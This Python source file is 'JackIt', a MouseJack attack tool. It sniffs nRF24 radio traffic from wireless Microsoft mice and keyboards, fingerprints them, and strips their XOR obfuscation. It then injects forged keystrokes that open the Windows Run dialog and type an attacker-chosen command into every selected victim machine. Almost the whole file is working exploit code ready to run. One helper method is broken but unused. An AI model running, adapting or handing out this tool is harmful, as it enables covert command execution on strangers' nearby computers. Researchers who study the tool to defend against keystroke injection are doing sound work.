#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
from lib import nrf24
import os
import click
import tabulate
import hidscript

__version__ = 0.01
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

enable_debug = False


class NordicScanner:

    def __init__(self, radio, ack_timeout=5, retries=1, debug=False):
        self.radio = radio
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.ack_timeout = max(0, min(ack_timeout, 15))
        self.retries = max(0, min(retries, 15))
        self.ping_payload = '0F:0F:0F:0F'.replace(':', '').decode('hex')

    def _debug(self, text):
        if self.debug:
            print  P + "[D] " + W + text

    def hexify(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def scan(self, timeout=5.0):
        # Put the radio in promiscuous mode
        self.radio.enter_promiscuous_mode('')
        dwell_time = 0.1

        # Set the initial channel
        self.radio.set_channel(self.channels[self.channel_index])

        # Sweep through the self.channels and decode ESB packets in pseudo-promiscuous mode
        last_tune = time.time()
        total_time = time.time()

        try:
            while time.time() - total_time < timeout:

                if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                    self.channel_index = (self.channel_index + 1) % (len(self.channels))
                    self.radio.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()

                value = self.radio.receive_payload()
                if len(value) >= 5:
                    address, payload = value[0:5], value[5:]
                    a = self.hexify(address)
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))

                    if a in self.devices:
                        self.devices[a]['count'] += 1
                        self.devices[a]['timestamp'] = time.time()
                        if not self.channels[self.channel_index] in self.devices[a]['channels']:
                            self.devices[a]['channels'].append(self.channels[self.channel_index])
                        # Updates the payload to the longest -- ignores packets len 20 or higher (AES keyboard)
                        if len(payload) > len(self.devices[a]['payload']) and len(payload) < 20:
                            self.devices[a]['payload'] = payload
                    else:
                            self.devices[a] = { 'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload }
                            self.devices[a]['timestamp'] = time.time()
        except RuntimeError:
            exit(-1)
        return self.devices

    def sniff(self, address):
        self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))


class NordicGenericHID:
    hid_map = {
        0x04:  ['a','A'],
        0x05:  ['b','B'],
        0x06:  ['c','C'],
        0x07:  ['d','D'],
        0x08:  ['e','E'],
        0x09:  ['f','F'],
        0x0A:  ['g','G'],
        0x0B:  ['h','H'],
        0x0C:  ['i','I'],
        0x0D:  ['j','J'],
        0x0E:  ['k','K'],
        0x0F:  ['l','L'],
        0x10:  ['m','M'],
        0x11:  ['n','N'],
        0x12:  ['o','O'],
        0x13:  ['p','P'],
        0x14:  ['q','Q'],
        0x15:  ['r','R'],
        0x16:  ['s','S'],
        0x17:  ['t','T'],
        0x18:  ['u','U'],
        0x19:  ['v','V'],
        0x1A:  ['w','W'],
        0x1B:  ['x','X'],
        0x1C:  ['y','Y'],
        0x1D:  ['z','Z'],
        0x1E:  ['1','!'],
        0x1F:  ['2','@'],
        0x20:  ['3','#'],
        0x21:  ['4','$'],
        0x22:  ['5','%'],
        0x23:  ['6','^'],
        0x24:  ['7','&'],
        0x25:  ['8','*'],
        0x26:  ['9','('],
        0x27:  ['0',')'],
        0x28:  ['\n','\n'],
        0x29:  ['[ESC]', '[ESC]'],
        0x2A:  ['[BKSP]', '[BKSP]'],
        0x2B:  ['\t','\t'],
        0x2C:  [' ',' '],
        0x2D:  ['-','_'],
        0x2E:  ['=','+'],
        0x2F:  ['[','{'],
        0x30:  [']','}'],
        0x31:  ['\\','|'],
        0x32:  ['#','-'],
        0x33:  [';',':'],
        0x34:  ['\'','"'],
        0x35:  ['`','~'],
        0x36:  [',','<'],
        0x37:  ['.','>'],
        0x38:  ['/','?'],
        0x39:  ['[CAPS]', '[CAPS]'],
        0x3A:  ['[F1]', '[F1]'],
        0x3B:  ['[F2]', '[F2]'],
        0x3C:  ['[F3]', '[F3]'],
        0x3D:  ['[F4]', '[F4]'],
        0x3E:  ['[F5]', '[F5]'],
        0x3F:  ['[F6]', '[F6]'],
        0x40:  ['[F7]', '[F7]'],
        0x41:  ['[F8]', '[F8]'],
        0x42:  ['[F9]', '[F9]'],
        0x43:  ['[F10]', '[F10]'],
        0x44:  ['[F11]', '[F11]'],
        0x45:  ['[F12]', '[F12]'],
        0x46:  ['[PrintScr]', '[PrintScr]'],
        0x47:  ['[ScrollLock]','[ScrollLock]'],
        0x48:  ['[NumLock]','[NumLock]']
        # ...etc. There are more on http://www.freebsddiary.org/APC/usb_hid_usages.php
    }

    def __init__(self, radio, address, payload):
        self.radio = radio
        self.address = address
        self.string_address = self.hexify(address)
        self.raw_address = self.unhexify_addr(self.string_address)
        self.payload = payload[:]
        self.ack_timeout = 4
        self.retries = 15
        self.device_type = 'Generic'
        self.configure()

    def configure(self):
        raise NotImplementedError('Not implemented in generic HID')

    def hexify(self, val):
        return ':'.join('{:02X}'.format(b) for b in val)

    def unhexify_addr(self, val):
        return self.unhexify(val)[::-1][:5]

    def unhexify(self, val):
        return val.replace(':', '').decode('hex')

    def xor_crypt(self, pay):
        p = pay[:]
        for i in range(4, len(p)):
            p[i] ^= ord(self.raw_address[(i - 4) % 5])
        return p

    def serialize_payload(self, p):
        return str(bytearray(p))

    def hid_decode(hid, meta):
        if key in self.hid_map:
            shift = 0
            if meta & 0x22:
                shift = 1
            return self.hid_map[key][shift]
        else:
            return ''

    def checksum(self):
        self.payload[-1] = 0
        for i in range(0, len(self.payload) - 1):
            self.payload[-1] ^= self.payload[i]
        self.payload[-1] = ~self.payload[-1] & 0xff

    def inc_sequence(self):
        if self.payload[4] == 255:
            self.payload[5] += 1
            self.payload[4] = 0
        else:
            self.payload[4] += 1

    def set_key(self, key):
        raise NotImplementedError('Not implemented in generic HID')

    def post_keystroke_delay(self):
        pass

    def transmit(self, c=''):
        self.set_key(c)
        self.raw_transmit()

    def raw_transmit(self):
        self.inc_sequence()
        self.checksum()
        self.radio.transmit_payload(self.serialize_payload(self.payload), self.ack_timeout, self.retries)
        self.post_keystroke_delay()

    def send_attack(self, attack):
        for _ in range(5):
            self.transmit()

        self.send_run()
        with click.progressbar(attack) as bar:
            for c in bar:
                self.transmit(c)
                self.transmit()
        
        self.transmit()

    def set_run_key(self):
        raise NotImplementedError('Not implemented in generic HID')

    def send_run(self):
        self.set_run_key()
        self.raw_transmit()
        self.transmit()
        time.sleep(0.2)


class MicrosoftMouseDefaultHID(NordicGenericHID):
    def configure(self):
        self.device_type = 'Microsoft Mouse'
        self.payload = self.payload.tolist()
        # clear sequence number
        self.payload[4:6] = [0, 0]
        # clear frame contents
        self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

    def set_key(self, key):
        # device type = keyboard
        self.payload[6] = 67
        # clear second to last byte
        self.payload[17] = 0

        # special handling to indicate null transmit (reset key state)
        if key == '':
            self.payload[7] = 0
            self.payload[9] = 0
            return

        # now send key, with shift if necessary
        for k, v in self.hid_map.iteritems():
            if v[0] == key:
                # clear special keys
                self.payload[7] = 0
                self.payload[9] = k
                return
            elif v[1] == key:
                # hold shift
                self.payload[7] = 2
                self.payload[9] = k
                return

    def set_run_key(self):
        self.payload[6] = 67
        self.payload[17] = 0
        self.payload[7] = 0x08
        self.payload[9] = 0x15


class MicrosoftMouseEncryptHID(MicrosoftMouseDefaultHID):
    def configure(self):
        self.device_type = 'Microsoft Mouse XOR-Encrypted'
        # first decrypt the packet
        self.payload = self.xor_crypt(self.payload)
        self.payload = self.payload.tolist()
        # clear sequence number
        self.payload[4:6] = [0, 0]
        # clear frame contents
        self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

    def serialize_payload(self, p):
        # re-encrypt before transmission
        return str(bytearray(self.xor_crypt(p)))

    def post_keystroke_delay(self):
        # testing found that encrypted keyboards require a short inter-key delay
        time.sleep(0.005)


class MicrosoftKeyboardEncryptHID(MicrosoftMouseEncryptHID):
    def configure(self):
        self.device_type = 'Microsoft Keyboard XOR-Encrypted'
        # first decrypt the packet
        self.payload = self.xor_crypt(self.payload)
        self.payload = self.payload.tolist()
        # clear sequence number
        self.payload[4:6] = [0, 0]
        # clear frame contents
        self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]

    def set_key(self, key):
        # clear second to last byte
        self.payload[14] = 0

        # special handling to indicate null transmit (reset key state)
        if key == '':
            self.payload[7] = 0
            self.payload[9] = 0
            return

        # now send key, with shift if necessary
        for k, v in self.hid_map.iteritems():
            if v[0] == key:
                # clear special keys
                self.payload[7] = 0
                self.payload[9] = k
                return
            elif v[1] == key:
                # hold shift
                self.payload[7] = 32
                self.payload[9] = k
                return

    def set_run_key(self):
        self.payload[6] = 67
        self.payload[14] = 0
        self.payload[7] = 0x08
        self.payload[9] = 0x15


def fingerprint_device(r, a, p):
    if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
        # Most likely a non-XOR encrypted Microsoft mouse
        return MicrosoftMouseDefaultHID(r, a, p)
    elif len(p) == 19 and p[0] == 0x0a:
        # Most likely an XOR encrypted Microsoft mouse
        return MicrosoftMouseEncryptHID(r, a, p)
    elif len(p) == 16 and p[0] == 0x0a:
        # Most likely an XOR encrypted Microsoft keyboard
        return MicrosoftKeyboardEncryptHID(r, a, p)
    else:
        return False


def _debug(debug, text):
    if debug:
        print  P + "[D] " + W + text

def banner():
    print """
     ____.              __   .___  __   
    |    |____    ____ |  | _|   |/  |_ 
    |    \__  \ _/ ___\|  |/ /   \   __\\
/\__|    |/ __ \\\\  \___|    <|   ||  |  
\________(____  /\___  >__|_ \___||__|  
              \/     \/     \/          """

    print "JackIt Version %0.2f" % __version__
    print "Created by %s" % __authors__
    print ""

def confirmroot():
    # make sure we are root
    if os.getuid() != 0:
        print R + "[!] " + W + "You need to run as root!"
        exit(-1)

@click.command()
@click.option('--debug', is_flag=True, help='Enable debug.')
@click.option('--attack', default="calc.exe\n", help="String to use for the attack")
@click.option('--attackfile', default="", type=click.Path())
@click.option('--scriptfile', default="", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
def cli(debug, attack, lowpower, interval, attackfile, scriptfile):

    banner()

    if debug:
        print O + "[W] " + W + "Debug is enabled"

    if attackfile == "":
        attack = attack.decode('string_escape')
    else:
        f = open(attackfile,'r')
        attack = f.read()

    _debug(debug,"Attack is: " + attack.encode('string_escape'))
    
    confirmroot()

    # Initialize the radio
    try:
        radio = nrf24.nrf24(0)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            print R + "[!] " + W + "Cannot find Crazy PA USB dongle."
            print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
            exit(-1)

    # Assume Crazyradio PA
    if lowpower:
        print G + "[+] " + W + "Low power mode enabled"
    else:
        radio.enable_lna()

    # Create scanner instance
    scan = NordicScanner(radio=radio, debug=debug)

    print G + "[+] " + W + 'Scanning...'

    # Enter main loop
    try:
        try:
            while True:
                devices = scan.scan(interval)

                click.clear()
                print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
                print ""
                
                idx = 0
                pretty_devices = []
                for key, device in devices.iteritems():
                    idx = idx + 1
                    pretty_devices.append([
                        idx,
                        key,
                        ",".join(str(x) for x in device['channels']),
                        device['count'],
                        str(int(time.time() - device['timestamp'])) + 's ago',
                        scan.hexify(device['payload'])
                    ])


                print tabulate.tabulate(pretty_devices, headers=["KEY","ADDRESS","CHANNELS","COUNT","SEEN","PACKET"])
        except KeyboardInterrupt:
            print ""

        if 'devices' not in locals() or len(devices) == 0:
            print R + "[!] " + W + "No devices found please try again..."
            exit(-1)
        
        print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
                    " separated by commas, or '%s': " % (G + 'all' + W),
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            victims = pretty_devices[:]
        else:
            victims = []
            for vic in value.split(","):
                if int(vic) <= len(pretty_devices):
                    victims.append(pretty_devices[(int(vic)-1)])
                else:
                    print R + "[!] " + W + ("Device %d key is out of range" % int(vic))

        targets = []
        for victim in victims:
            if victim[1] in devices:
                targets.append(devices[victim[1]])

        for target in targets:
            payload = target['payload']
            channels = target['channels']
            address = target['address']

            scan.sniff(address)
            device = fingerprint_device(radio, address, payload)
            
            if device:
                for channel in channels:
                    radio.set_channel(channel)
                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, channel)
                    device.send_attack(attack)
            else:
                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (scan.hexify(address))
                continue

        print GR + '\n[+] ' + W + "All attacks completed\n"

    except KeyboardInterrupt:
        print '\n ' + R + '(^C)' + O + ' interrupted\n'
        print "[-] Quitting"

if __name__ == '__main__':
    cli()
